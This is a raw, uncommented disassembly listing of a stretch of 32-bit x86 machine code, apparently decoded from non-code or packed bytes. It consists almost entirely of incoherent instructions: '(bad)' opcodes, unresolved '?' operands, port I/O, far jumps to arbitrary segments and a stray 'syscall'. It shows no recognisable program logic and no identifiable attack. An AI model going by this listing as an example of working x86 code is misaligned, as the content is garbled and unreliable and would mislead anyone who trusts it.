  4118a0:	lds    esp,FWORD PTR [edx-0x32cf42be]
  4118a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118a7:	int3   
  4118a8:	push   edx
  4118a9:	jp     0x411870
  4118ab:	js     0x41190c
  4118ad:	or     BYTE PTR [edi+0x7],ch
  4118b0:	daa    
  4118b1:	not    DWORD PTR [ebp-0x75f1803c]
  4118b7:	cwde   
  4118b8:	mov    dl,BYTE PTR [ebx-0x74]
  4118bb:	fisub  DWORD PTR [edx+0xb6862fd]
  4118c1:	jae    0x41192e
  4118c3:	data16 fnstsw WORD PTR ds:0x8ce4b6bf
  4118ca:	cwde   
  4118cb:	data16 jb 0x4118a5
  4118ce:	inc    edx
  4118cf:	nop
  4118d0:	push   ebp
  4118d1:	popa   
  4118d2:	or     bh,BYTE PTR [esi]
  4118d4:	stos   BYTE PTR es:[edi],al
  4118d5:	xor    esi,DWORD PTR [ebx-0x38]
  4118d8:	mov    WORD PTR [edi+0x64],?
  4118db:	add    BYTE PTR [edi+edx*8+0x347fc3f5],0x1b
  4118e3:	adc    BYTE PTR ss:[ebx-0xf],0xb1
  4118e8:	inc    ebx
  4118e9:	jl     0x411962
  4118eb:	leave  
  4118ec:	jle    0x411937
  4118ee:	dec    eax
  4118ef:	int    0x56
  4118f1:	jnp    0x4118db
  4118f3:	add    eax,0xef892497
  4118f8:	mov    esp,0x9523e817
  4118fd:	mov    dh,0xdc
  4118ff:	mov    edx,0xe1362f56
  411904:	mov    dl,cl
  411906:	or     ebx,DWORD PTR [edi]
  411908:	aaa    
  411909:	lock lods al,BYTE PTR ds:[esi]
  41190b:	mov    dl,0xb8
  41190d:	xchg   ebp,eax
  41190e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41190f:	push   ecx
  411910:	out    dx,eax
  411911:	mov    WORD PTR [ecx],?
  411913:	mov    bh,0xa5
  411915:	jne    0x411952
  411917:	jne    0x41196d
  411919:	aam    0xd0
  41191b:	rcr    DWORD PTR [ecx-0xf],1
  41191e:	fwait
  41191f:	scas   al,BYTE PTR es:[edi]
  411920:	dec    esi
  411921:	jl     0x41199e
  411923:	(bad)
  411926:	leave  
  411927:	je     0x411971
  411929:	ret    0x6120
  41192c:	pop    es
  41192d:	arpl   WORD PTR [ebx-0x61e70562],ax
  411933:	push   0x325d6e4b
  411938:	popf   
  411939:	call   0x279c8f60
  41193e:	lods   eax,DWORD PTR ds:[esi]
  41193f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411940:	dec    ecx
  411941:	dec    ecx
  411942:	imul   ebp,esp,0x18e18504
  411948:	dec    DWORD PTR [esp+ecx*4]
  41194b:	test   al,0xb4
  41194d:	and    BYTE PTR [ebx+eiz*8],ah
  411950:	dec    edi
  411951:	clc    
  411952:	aaa    
  411953:	gs mov cl,0xed
  411956:	scas   al,BYTE PTR es:[edi]
  411957:	and    DWORD PTR [ecx+0x1a229d66],eax
  41195d:	mov    cl,0x84
  41195f:	dec    esi
  411960:	inc    ebp
  411961:	push   eax
  411962:	xlat   BYTE PTR ds:[ebx]
  411963:	mov    DWORD PTR [eax+0x37631461],esi
  411969:	jno    0x4119a1
  41196b:	dec    edi
  41196c:	hlt    
  41196d:	sub    cl,BYTE PTR [edx]
  41196f:	xchg   ebx,eax
  411970:	ds stos DWORD PTR es:[edi],eax
  411972:	xchg   ebx,eax
  411973:	inc    ebx
  411974:	push   esi
  411975:	(bad)  
  411976:	cmp    edi,esp
  411978:	dec    esp
  411979:	jmp    0xa13aa220
  41197e:	js     0x4119fa
  411980:	in     eax,0xd2
  411982:	push   0x61
  411984:	popf   
  411985:	push   esp
  411986:	sub    eax,0xd8fe5836
  41198b:	mov    bh,0x98
  41198d:	int    0x94
  41198f:	in     al,0xc4
  411991:	add    dh,BYTE PTR [eax]
  411993:	add    BYTE PTR [ebx],al
  411995:	dec    BYTE PTR [ecx-0x7c5f9f03]
  41199b:	cs sub bl,bh
  41199e:	cmp    al,0x2c
  4119a0:	inc    ebx
  4119a1:	rol    BYTE PTR [ebp+0x6e24660c],cl
  4119a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119a8:	mov    BYTE PTR [ecx+0x7086d8d2],dh
  4119ae:	cli    
  4119af:	xor    eax,0xbba14171
  4119b4:	leave  
  4119b5:	out    0xd9,al
  4119b7:	dec    ebx
  4119b8:	loopne 0x4119ee
  4119ba:	mov    ds:0x91ca6a0d,eax
  4119bf:	out    0xa4,al
  4119c1:	iret   
  4119c2:	sbb    esi,DWORD PTR [esi]
  4119c4:	cmp    ebp,edi
  4119c6:	inc    edx
  4119c7:	sahf   
  4119c8:	call   0x380e:0x55138eed
  4119cf:	cmp    ecx,edx
  4119d1:	jbe    0x4119c2
  4119d3:	xor    BYTE PTR [ebx+0x42c25b67],ah
  4119d9:	aad    0xaf
  4119db:	push   eax
  4119dc:	sub    bl,bh
  4119de:	sub    eax,0xc9134be
  4119e3:	mov    WORD PTR [esi],fs
  4119e5:	leave  
  4119e6:	inc    edi
  4119e7:	test   al,0xb6
  4119e9:	xchg   ecx,eax
  4119ea:	cmp    ch,BYTE PTR [ecx+0x2a]
  4119ed:	mov    cl,0xf9
  4119ef:	je     0x411a0f
  4119f1:	mov    dh,0x21
  4119f3:	les    edi,FWORD PTR [ecx-0x3b]
  4119f6:	cmp    al,0x74
  4119f8:	cmp    cl,0x5c
  4119fb:	gs adc al,0x6
  4119fe:	call   0x8d71:0x657fa710
  411a05:	fld    TBYTE PTR [esi-0x27]
  411a08:	jo     0x4119a8
  411a0a:	aam    0x8d
  411a0c:	ins    BYTE PTR es:[edi],dx
  411a0d:	xor    dl,BYTE PTR [edi-0x3a3c23de]
  411a13:	shl    DWORD PTR [eax+0x4e4018],0x99
  411a1a:	add    bh,dl
  411a1c:	jmp    0x7de4:0x5b620aee
  411a23:	inc    eax
  411a24:	aam    0x7c
  411a26:	pop    es
  411a27:	jno    0x4119dc
  411a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a2a:	stc    
  411a2b:	jne    0x411a8d
  411a2d:	loope  0x4119ca
  411a2f:	pop    ebx
  411a30:	sti    
  411a31:	mov    al,ds:0x6bb5882d
  411a36:	out    dx,al
  411a37:	cmc    
  411a38:	xor    eax,0xb070ae49
  411a3d:	pushf  
  411a3e:	aaa    
  411a3f:	mov    cl,0x12
  411a41:	cld    
  411a42:	outs   dx,BYTE PTR ds:[esi]
  411a43:	jmp    0xbf24:0xc84bc8e
  411a4a:	pushf  
  411a4b:	retf   0xd0bf
  411a4e:	daa    
  411a4f:	test   DWORD PTR [edx],0x2624614c
  411a55:	xchg   DWORD PTR ds:0x777aaacc,ebp
  411a5b:	out    dx,eax
  411a5c:	(bad)  
  411a5d:	iret   
  411a5e:	jmp    0x1742:0x5f1348b
  411a65:	mov    BYTE PTR [edi-0x36024b23],cl
  411a6b:	loop   0x411ae0
  411a6d:	push   es
  411a6e:	push   ds
  411a6f:	cmp    DWORD PTR [ebx+0x9373f93],edx
  411a75:	lahf   
  411a76:	shl    BYTE PTR [edx+0x4adc3393],cl
  411a7c:	popa   
  411a7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a7e:	mov    ds:0xc4aba765,al
  411a83:	out    dx,eax
  411a84:	rcr    BYTE PTR [ecx],1
  411a86:	pop    ds
  411a87:	sahf   
  411a88:	retf   
  411a89:	pop    ss
  411a8a:	mov    DWORD PTR [ecx+0x64],esp
  411a8d:	adc    eax,DWORD PTR ds:0x67f38ad3
  411a93:	jmp    0x411aa0
  411a95:	in     eax,0x4d
  411a97:	gs lahf 
  411a99:	and    BYTE PTR [edi+ebp*4],cl
  411a9c:	out    0xf5,al
  411a9e:	js     0x411b11
  411aa0:	jl     0x411a69
  411aa2:	ss lock in al,0x69
  411aa6:	int3   
  411aa7:	loopne 0x411a80
  411aa9:	xchg   esp,eax
  411aaa:	pop    ss
  411aab:	xchg   edx,eax
  411aac:	inc    ebx
  411aad:	push   ecx
  411aae:	cmc    
  411aaf:	jae    0x411a69
  411ab1:	mov    cs,WORD PTR [ebx+esi*1]
  411ab4:	xchg   edi,eax
  411ab5:	push   ebx
  411ab6:	push   ebp
  411ab7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ab8:	dec    esp
  411ab9:	mov    ecx,DWORD PTR fs:[ebp+0x25109f11]
  411ac0:	or     DWORD PTR [edi],edx
  411ac2:	sub    bh,BYTE PTR [esi]
  411ac4:	xchg   BYTE PTR [edi+0x702d3183],bh
  411aca:	sar    ebp,0x8b
  411acd:	setne  bl
  411ad0:	int3   
  411ad1:	push   cs
  411ad2:	inc    ebx
  411ad3:	bts    ebx,edx
  411ad6:	jnp    0x411b26
  411ad8:	and    eax,0x4a1aef73
  411add:	sbb    ebx,0xffffffb9
  411ae0:	scas   eax,DWORD PTR es:[edi]
  411ae1:	sub    DWORD PTR [ebx-0x69],eax
  411ae4:	sub    BYTE PTR [ecx+0x1291e769],bh
  411aea:	aam    0x1a
  411aec:	cmp    eax,0x30bc365e
  411af1:	cld    
  411af2:	or     DWORD PTR [ebx-0x52f5cd96],eax
  411af8:	jae    0x411b41
  411afa:	mov    ebp,0xc189d6c3
  411aff:	(bad)  
  411b01:	add    al,BYTE PTR [edi-0x58]
  411b04:	lds    esi,FWORD PTR [eax+0x49]
  411b07:	stc    
  411b08:	shl    ebp,1
  411b0a:	fwait
  411b0b:	xchg   ebx,eax
  411b0c:	sub    dh,BYTE PTR [ecx-0x73]
  411b0f:	dec    eax
  411b10:	mov    esi,0x45b17338
  411b15:	rol    DWORD PTR [ecx],0x1d
  411b18:	add    DWORD PTR ss:[edx],ebx
  411b1b:	into   
  411b1c:	js     0x411b8a
  411b1e:	lods   eax,DWORD PTR ds:[esi]
  411b1f:	and    dh,ch
  411b21:	mov    DWORD PTR [edx+eiz*2-0x248b2d56],ebx
  411b28:	push   ecx
  411b29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b2a:	and    eax,0xd0a6b750
  411b2f:	xchg   esp,eax
  411b30:	das    
  411b31:	mul    BYTE PTR fs:0xef1e98f
  411b38:	lea    ebx,[ecx+ecx*4]
  411b3b:	xor    ah,BYTE PTR [edi-0x695273e9]
  411b41:	sub    eax,0x2fff5146
  411b46:	push   esi
  411b47:	lods   eax,DWORD PTR ds:[esi]
  411b48:	pop    es
  411b49:	adc    al,0x1e
  411b4b:	std    
  411b4c:	idiv   BYTE PTR [edi]
  411b4e:	enter  0x9480,0xcb
  411b52:	pop    ebx
  411b53:	(bad)  
  411b54:	data16 cli 
  411b56:	je     0x411b77
  411b58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b59:	dec    ebx
  411b5a:	jns    0x411aeb
  411b5c:	jecxz  0x411b6f
  411b5e:	dec    ebx
  411b5f:	jbe    0x411bd2
  411b61:	or     eax,0x71973474
  411b66:	or     BYTE PTR [eax+0x312044fc],ah
  411b6c:	adc    eax,0x17d5d1f8
  411b71:	pop    esp
  411b72:	repnz push 0x7b
  411b75:	dec    eax
  411b76:	(bad)  
  411b77:	icebp  
  411b78:	clc    
  411b79:	inc    ecx
  411b7a:	out    0x5b,al
  411b7c:	(bad)  
  411b7d:	jbe    0x411b91
  411b7f:	mov    dl,0x1e
  411b81:	xchg   ebx,eax
  411b82:	outs   dx,DWORD PTR ds:[esi]
  411b83:	xchg   ebx,eax
  411b84:	in     eax,0x3e
  411b86:	xor    esp,DWORD PTR [ebx+0x3e0a1259]
  411b8c:	in     al,0xc5
  411b8e:	outs   dx,DWORD PTR ds:[esi]
  411b8f:	push   ss
  411b90:	lea    esi,[esi+0x13]
  411b93:	pop    eax
  411b94:	stos   DWORD PTR es:[edi],eax
  411b95:	and    eax,0xf735d6c9
  411b9a:	cmp    ebx,ecx
  411b9c:	repz or eax,0x8d9ac108
  411ba2:	in     eax,0x55
  411ba4:	inc    edi
  411ba5:	inc    esi
  411ba6:	pop    ds
  411ba7:	int    0x9c
  411ba9:	shr    BYTE PTR [esi+0x1b],1
  411bac:	arpl   WORD PTR [eax],cx
  411bae:	cmc    
  411baf:	lahf   
  411bb0:	cmp    eax,0xbfcc51b0
  411bb5:	out    0x52,eax
  411bb7:	imul   ecx,edx,0x10
  411bba:	mov    ecx,0xaff70224
  411bbf:	lds    ebx,FWORD PTR [esi]
  411bc1:	inc    edi
  411bc2:	push   0x7ecace21
  411bc7:	push   eax
  411bc8:	clc    
  411bc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bca:	mov    ebx,0x75380565
  411bcf:	sti    
  411bd0:	int3   
  411bd1:	bound  edi,QWORD PTR [esi]
  411bd3:	lods   eax,DWORD PTR ds:[esi]
  411bd4:	jg     0x411c06
  411bd6:	popf   
  411bd7:	repz cwde 
  411bd9:	addr16 push ds
  411bdb:	dec    eax
  411bdc:	in     al,dx
  411bdd:	jns    0x411c07
  411bdf:	and    al,0x40
  411be1:	stc    
  411be2:	fwait
  411be3:	jns    0x411bd3
  411be5:	into   
  411be6:	js     0x411bbf
  411be8:	stos   DWORD PTR es:[edi],eax
  411be9:	adc    cl,BYTE PTR [ecx-0x61]
  411bec:	test   al,0xdb
  411bee:	mov    WORD PTR [ebx-0x5],?
  411bf1:	push   0xffffffd2
  411bf3:	fstp   TBYTE PTR [ebx+0x292d616c]
  411bf9:	jno    0x411bf2
  411bfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bfc:	or     DWORD PTR [edx+esi*4+0x7c581e5],edx
  411c03:	fisubr DWORD PTR [ecx]
  411c05:	mul    DWORD PTR ds:0xb7f5b0d8
  411c0b:	sahf   
  411c0c:	jnp    0x411c14
  411c0e:	jle    0x411c61
  411c10:	pop    ds
  411c11:	(bad)  [ebp+0x2]
  411c14:	hlt    
  411c15:	stos   BYTE PTR es:[edi],al
  411c16:	xchg   BYTE PTR [eax],al
  411c18:	ds jecxz 0x411bd5
  411c1b:	jns    0x411c38
  411c1d:	xchg   esp,eax
  411c1e:	push   es
  411c1f:	ins    DWORD PTR es:[edi],dx
  411c20:	and    BYTE PTR ds:[esi+0x3ad8e08b],dl
  411c27:	push   ss
  411c28:	rcr    DWORD PTR [edi],1
  411c2a:	adc    eax,DWORD PTR [edx+0x153d554a]
  411c30:	inc    eax
  411c31:	fstp   TBYTE PTR [esi-0x61]
  411c34:	jo     0x411bdc
  411c36:	ds inc esi
  411c38:	mov    edx,0x7d21dd5e
  411c3d:	std    
  411c3e:	mov    ebp,0x20f4c0a4
  411c44:	pop    esp
  411c45:	int3   
  411c46:	sub    al,0x10
  411c48:	jns    0x411c58
  411c4a:	and    cl,ah
  411c4c:	pop    ds
  411c4d:	(bad)  
  411c4e:	out    0xab,al
  411c50:	xor    BYTE PTR [edx+0x4d7a50d3],bl
  411c56:	retf   
  411c57:	ins    BYTE PTR es:[di],dx
  411c59:	test   BYTE PTR [eax-0x7d],bh
  411c5c:	push   ebp
  411c5d:	(bad)  
  411c5e:	fmul   QWORD PTR [ecx+0x44117a04]
  411c64:	xchg   ebp,eax
  411c65:	shr    DWORD PTR [ebx+0x38],cl
  411c68:	stos   DWORD PTR es:[edi],eax
  411c69:	cli    
  411c6a:	lahf   
  411c6b:	adc    ebp,DWORD PTR [ebx-0x35]
  411c6e:	xchg   edi,eax
  411c6f:	imul   ebp,edi,0x28
  411c72:	sbb    ecx,DWORD PTR [ebx]
  411c74:	add    bh,BYTE PTR [ebp+0x4a8acf75]
  411c7a:	enter  0x375a,0x64
  411c7e:	or     cl,BYTE PTR [esi+0x6304f449]
  411c84:	jbe    0x411c65
  411c86:	into   
  411c87:	imul   dl
  411c89:	add    al,0x63
  411c8b:	mov    bl,0x66
  411c8d:	div    dl
  411c8f:	mov    esp,0x4865d72c
  411c94:	add    DWORD PTR [esi],esi
  411c96:	mov    ecx,0x9d37fe94
  411c9b:	inc    esp
  411c9c:	fnstcw WORD PTR [esi]
  411c9e:	push   0xffffffde
  411ca0:	shl    BYTE PTR [edi],0x1c
  411ca3:	shl    edx,1
  411ca5:	daa    
  411ca6:	es cmc 
  411ca8:	sub    dl,BYTE PTR [edi]
  411caa:	add    DWORD PTR [esi+0x61],esp
  411cad:	xchg   ebp,eax
  411cae:	jb     0x411d1a
  411cb0:	into   
  411cb1:	in     al,dx
  411cb2:	jmp    0x57ed0f1c
  411cb7:	and    al,0x41
  411cb9:	and    al,bl
  411cbb:	movups xmm7,XMMWORD PTR ds:0x80c0471
  411cc2:	ficomp DWORD PTR [esp+eax*1+0x11]
  411cc6:	stc    
  411cc7:	mov    bl,0x47
  411cc9:	inc    ebx
  411cca:	imul   esp,DWORD PTR [edx-0x795e37a5],0xfa4167ca
  411cd4:	mov    ?,esi
  411cd6:	add    al,0x75
  411cd8:	sbb    esp,eax
  411cda:	or     al,0x43
  411cdc:	in     al,0x82
  411cde:	test   al,0xa2
  411ce0:	and    al,0xac
  411ce3:	inc    edi
  411ce4:	stc    
  411ce5:	sar    DWORD PTR [ecx*1+0x36e94512],1
  411cec:	sub    esp,DWORD PTR [edx]
  411cee:	in     eax,dx
  411cef:	outs   dx,DWORD PTR ds:[esi]
  411cf0:	dec    edx
  411cf1:	aas    
  411cf2:	gs mov edi,0x4e439ef2
  411cf8:	les    edi,FWORD PTR [eax-0xd]
  411cfb:	sbb    eax,0x1610f688
  411d00:	push   ss
  411d01:	inc    ebx
  411d02:	dec    esi
  411d03:	and    bh,BYTE PTR [ebx]
  411d05:	cmp    edx,DWORD PTR [edi-0x58785794]
  411d0b:	push   esp
  411d0c:	(bad)  
  411d0d:	stos   DWORD PTR es:[edi],eax
  411d0e:	(bad)  
  411d0f:	adc    eax,0xd45fa387
  411d14:	jmp    0x411ca9
  411d16:	ret    
  411d17:	xchg   esi,eax
  411d18:	mov    WORD PTR [esi-0x611d8e7c],?
  411d1e:	jo     0x411d56
  411d20:	xchg   ebp,eax
  411d21:	push   ebp
  411d22:	out    dx,eax
  411d23:	scas   al,BYTE PTR es:[edi]
  411d24:	nop
  411d25:	shr    BYTE PTR [ecx*2-0x2e34faf1],1
  411d2c:	xchg   esi,eax
  411d2d:	rol    DWORD PTR [edi-0x61],1
  411d30:	and    DWORD PTR [eax],edi
  411d32:	fcom   QWORD PTR [edi-0x68]
  411d35:	xchg   esi,eax
  411d36:	sbb    eax,0x6acc386c
  411d3b:	fwait
  411d3c:	pop    edi
  411d3d:	lock cmc 
  411d3f:	lock leave 
  411d41:	xchg   esi,eax
  411d42:	clc    
  411d43:	adc    ebx,DWORD PTR [edx-0x11]
  411d46:	arpl   WORD PTR [ebx-0x17],ax
  411d49:	lahf   
  411d4a:	test   eax,0xef18902d
  411d4f:	pop    ss
  411d50:	xor    esp,0x1fdceaba
  411d56:	xchg   esp,eax
  411d57:	sbb    al,0x12
  411d59:	out    0x9d,eax
  411d5b:	add    eax,0xa9725bcd
  411d60:	sahf   
  411d61:	jae    0x411d2f
  411d63:	iret   
  411d64:	xor    DWORD PTR [esi+0x60],eax
  411d67:	xchg   edx,eax
  411d68:	imul   edi,DWORD PTR [edx],0xfffffffe
  411d6b:	outs   dx,BYTE PTR ds:[esi]
  411d6c:	out    0x9a,eax
  411d6e:	repz not ah
  411d71:	adc    BYTE PTR [ebx-0x3a30c13f],cl
  411d77:	mov    dl,0xe0
  411d79:	inc    eax
  411d7a:	lea    ebx,[eax+0x59]
  411d7d:	repz xor BYTE PTR [eax+0x4a],cl
  411d81:	repnz xchg ecx,eax
  411d83:	xor    DWORD PTR [ecx+0x20a864cf],esp
  411d89:	std    
  411d8a:	sub    eax,0x167a27ad
  411d8f:	adc    dh,ah
  411d91:	mov    al,0x5a
  411d93:	and    eax,0x1ed70afc
  411d98:	cmp    DWORD PTR [esi-0x37c7770c],esi
  411d9e:	xchg   ebx,eax
  411d9f:	push   0x374e38ec
  411da4:	cmp    eax,0xc3ccdbf8
  411da9:	jle    0x411d96
  411dab:	cmp    dl,ah
  411dad:	cmp    cl,BYTE PTR [eax-0x77]
  411db0:	test   eax,0x767df2da
  411db5:	add    ecx,DWORD PTR [edx-0x6f]
  411db8:	mov    eax,0xabbb141c
  411dbd:	loopne 0x411d4c
  411dbf:	and    DWORD PTR [eax+0x1e],esp
  411dc2:	adc    BYTE PTR [edx+0x78],dl
  411dc5:	xor    ecx,DWORD PTR [ecx+0x73190e0b]
  411dcb:	inc    ebp
  411dcc:	or     bl,bl
  411dce:	lds    ebp,FWORD PTR [ecx]
  411dd0:	xchg   DWORD PTR [esi-0x401868af],esp
  411dd6:	or     al,0xc9
  411dd8:	lahf   
  411dd9:	(bad)  
  411dda:	dec    ebx
  411ddb:	clc    
  411ddc:	fidiv  WORD PTR [eax+eax*2]
  411ddf:	jbe    0x411da4
  411de1:	rcr    ebx,cl
  411de3:	jo     0x411daa
  411de5:	fild   WORD PTR [eax]
  411de7:	popa   
  411de8:	sbb    eax,0xaaf7069f
  411ded:	cmp    ch,BYTE PTR [edx-0x23bb2b9e]
  411df3:	sbb    cl,BYTE PTR [ebp+esi*8-0x5f]
  411df7:	jnp    0x411d88
  411df9:	xchg   cl,dh
  411dfb:	test   BYTE PTR [edi],bl
  411dfd:	dec    eax
  411dfe:	stos   DWORD PTR es:[edi],eax
  411dff:	repz cmp edi,edx
  411e02:	and    al,0xd7
  411e04:	out    dx,eax
  411e05:	cmp    BYTE PTR es:[esi+0x19],0xeb
  411e0a:	fsubp  st(1),st
  411e0c:	mov    ebp,0xfb635799
  411e11:	cmp    bh,al
  411e13:	adc    edx,esp
  411e15:	adc    al,0xd9
  411e17:	mov    ds:0x43cd71d1,eax
  411e1c:	out    dx,eax
  411e1d:	fstp   DWORD PTR [eax+0x6e2eb184]
  411e23:	daa    
  411e24:	out    dx,al
  411e25:	or     bh,BYTE PTR [ecx]
  411e27:	pusha  
  411e28:	pop    ebp
  411e29:	test   DWORD PTR [esi+0x3f],edx
  411e2c:	mov    esp,0x631278c1
  411e31:	out    0x43,al
  411e33:	push   esp
  411e34:	cmp    eax,0xd8278957
  411e39:	mov    ds:0x4ebb83fb,eax
  411e3e:	xchg   ebx,eax
  411e3f:	inc    ecx
  411e40:	dec    ecx
  411e41:	jecxz  0x411e83
  411e43:	mov    ds:0x302346b0,al
  411e48:	sub    ebx,DWORD PTR [ebx-0x4c]
  411e4b:	xchg   DWORD PTR [eax+0x287b7360],ebx
  411e51:	outs   dx,BYTE PTR ds:[esi]
  411e52:	leave  
  411e53:	add    DWORD PTR [ebx-0x5b],esi
  411e56:	scas   eax,DWORD PTR es:[edi]
  411e57:	shl    DWORD PTR [edx-0x312fa2c2],cl
  411e5d:	inc    edi
  411e5e:	(bad)  
  411e60:	inc    eax
  411e61:	int    0x46
  411e63:	mov    dh,bl
  411e65:	in     eax,0xe9
  411e67:	pop    ebx
  411e68:	fs cmp eax,0xede44710
  411e6e:	sub    al,0x75
  411e70:	cld    
  411e71:	sub    DWORD PTR [ecx+0x16],0xe78b095e
  411e78:	retf   0xd177
  411e7b:	mov    ch,0xd6
  411e7d:	mov    ch,0x32
  411e7f:	fstp   DWORD PTR [edi-0x9]
  411e82:	out    0x40,eax
  411e84:	mov    ebp,0x1a525a5d
  411e89:	and    ecx,DWORD PTR [ecx-0x57]
  411e8c:	dec    edi
  411e8d:	dec    esp
  411e8e:	icebp  
  411e8f:	add    BYTE PTR [edx+0xc],dl
  411e92:	pop    eax
  411e93:	pop    ebp
  411e94:	add    eax,0xe7d2a7d6
  411e99:	daa    
  411e9a:	xlat   BYTE PTR ds:[ebx]
  411e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e9c:	imul   eax,DWORD PTR [edi],0xffffffb9
  411e9f:	cmp    al,0x19
  411ea1:	fisub  WORD PTR [esi+0x592422]
  411ea7:	clc    
  411ea8:	sbb    BYTE PTR [ebx+ecx*2],bl
  411eab:	sub    al,0x6a
  411ead:	jmp    0x58dcf07f
  411eb2:	push   ecx
  411eb3:	pop    esp
  411eb4:	fiadd  WORD PTR [edx*4+0x621953f9]
  411ebb:	and    al,0xec
  411ebd:	inc    esp
  411ebe:	or     BYTE PTR [ecx],al
  411ec0:	pusha  
  411ec1:	test   DWORD PTR [edx],edx
  411ec3:	add    al,0xea
  411ec5:	aam    0x68
  411ec7:	push   cs
  411ec8:	test   edi,edx
  411eca:	rol    DWORD PTR [ebx-0x7],1
  411ecd:	cmp    eax,0x6632d17b
  411ed2:	mov    al,0xf6
  411ed4:	rcr    DWORD PTR [ebp-0x18],cl
  411ed7:	jno    0x411e9a
  411ed9:	jmp    0x87adff50
  411ede:	cmp    edx,DWORD PTR [edx+edi*1]
  411ee1:	or     ebp,DWORD PTR [esi]
  411ee3:	dec    edi
  411ee4:	pop    ebx
  411ee5:	push   0xe926afc8
  411eea:	dec    edx
  411eeb:	push   esi
  411eec:	mov    ch,0x2a
  411eee:	dec    esp
  411eef:	xor    BYTE PTR [ebx],0x90
  411ef2:	out    dx,al
  411ef3:	mov    al,ds:0xef5a85b0
  411ef8:	jecxz  0x411f77
  411efa:	dec    ecx
  411efb:	syscall 
  411efd:	cmp    al,0x1d
  411eff:	sbb    al,0x11
  411f01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f02:	push   edi
  411f03:	sbb    al,0xb4
  411f05:	mov    al,ds:0xae94f932
  411f0a:	mov    BYTE PTR ds:0x732f9374,bl
  411f10:	ds sub al,0xfa
  411f13:	ret    0x4feb
  411f16:	aam    0x9a
  411f18:	ret    
  411f19:	xchg   ebx,eax
  411f1a:	xor    al,0x6
  411f1c:	daa    
  411f1d:	sbb    dl,al
  411f1f:	adc    DWORD PTR [ecx-0x639c81ee],ecx
  411f25:	jns    0x6cc5f16b
  411f2b:	arpl   WORD PTR [ebx+0x5f],bx
  411f2e:	cwde   
  411f2f:	sub    ecx,DWORD PTR [eax-0x1]
  411f32:	int    0x8e
  411f34:	rol    bl,1
  411f36:	sub    eax,0x7a3c9d2f
  411f3b:	pop    eax
  411f3c:	and    BYTE PTR [edx-0x3c],0xfe
  411f40:	js     0x411fa0
  411f42:	jne    0x411f3a
  411f44:	jl     0x411ee3
  411f46:	mov    ecx,0x16517981
  411f4b:	nop
  411f4c:	cmp    dh,cl
  411f4e:	jmp    0x48a74e00
  411f53:	cli    
  411f54:	jno    0x411f85
  411f56:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  411f58:	repnz adc bl,ch
  411f5b:	rcl    BYTE PTR [ecx+0x295c1726],1
  411f61:	pop    es
  411f62:	pop    ss
  411f63:	fisttp QWORD PTR [ebx+0x2]
  411f66:	aam    0xf5
  411f68:	out    0xf0,al
  411f6a:	out    0xbe,eax
  411f6c:	push   ds
  411f6d:	mov    eax,ds:0x6b456b88
  411f72:	fcom   QWORD PTR [edx-0xac1d4ff]
  411f78:	push   ebx
  411f79:	mov    bh,0x38
  411f7b:	cmp    BYTE PTR [edi+0x4f450e87],0xfe
  411f82:	add    cl,ah
  411f84:	in     al,0x9e
  411f86:	(bad)  [eax+esi*8]
  411f89:	aam    0x9
  411f8b:	or     esp,esi
  411f8d:	dec    edx
  411f8e:	pop    es
  411f8f:	xor    al,bl
  411f91:	and    DWORD PTR [ebx+0x46],edx
  411f94:	cld    
  411f95:	in     eax,0x36
  411f97:	mov    esp,DWORD PTR [edi+0x218e3220]
  411f9d:	gs mov ah,0xe5
  411fa0:	sub    dl,cl
  411fa2:	adc    ecx,DWORD PTR [ebx+ecx*1+0x2b]
  411fa6:	loop   0x411f8e
  411fa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411faa:	jecxz  0x411f85
  411fac:	mov    ch,0x50
  411fae:	fwait
  411faf:	test   DWORD PTR [ebp+0x2a],ecx
  411fb2:	xchg   DWORD PTR [ebp+0x67],eax
  411fb5:	bound  ecx,QWORD PTR [ebp-0x54]
  411fb8:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  411fba:	ins    BYTE PTR es:[edi],dx
  411fbb:	push   ecx
  411fbc:	mov    al,0x47
  411fbe:	stos   BYTE PTR es:[edi],al
  411fbf:	div    BYTE PTR [esp+edx*8]
  411fc2:	data16 and dl,ch
  411fc5:	rcr    DWORD PTR [ebx],0x41
  411fc8:	scas   eax,DWORD PTR es:[edi]
  411fc9:	lea    edx,[eax+0x7a8c08f0]
  411fcf:	push   cs
  411fd0:	(bad)  
  411fd1:	adc    BYTE PTR ds:0x5badd596,dh
  411fd7:	shr    dl,cl
  411fd9:	nop
  411fda:	jnp    0x412037
  411fdc:	jmp    0x411fd0
  411fde:	push   ss
  411fdf:	pop    edi
  411fe0:	(bad)  
  411fe1:	call   0xbf9850ca
  411fe6:	or     eax,0x41ad299
  411feb:	mov    BYTE PTR ds:0x7e1c525,ah
  411ff1:	mov    ch,0xf0
  411ff3:	retf   
  411ff4:	stos   BYTE PTR es:[edi],al
  411ff5:	pop    ds
  411ff6:	or     esp,DWORD PTR [ebx-0x36bcdfab]
  411ffc:	xchg   esp,eax
  411ffd:	stos   DWORD PTR es:[edi],eax
  411ffe:	lods   eax,DWORD PTR ds:[esi]
  411fff:	hlt    
  412000:	jns    0x411ffc
  412002:	ret    0x7453
  412005:	inc    dl
  412007:	xchg   ebx,eax
  412008:	test   eax,0xc8207e5f
  41200d:	sub    dh,dl
  41200f:	test   al,0x60
  412011:	add    bl,BYTE PTR [edx-0x1c]
  412014:	jle    0x412002
  412016:	sub    eax,0x38508954
  41201b:	pop    esp
  41201c:	jge    0x411ffd
  41201e:	ins    DWORD PTR es:[edi],dx
  41201f:	mov    ds,ebp
  412021:	out    dx,al
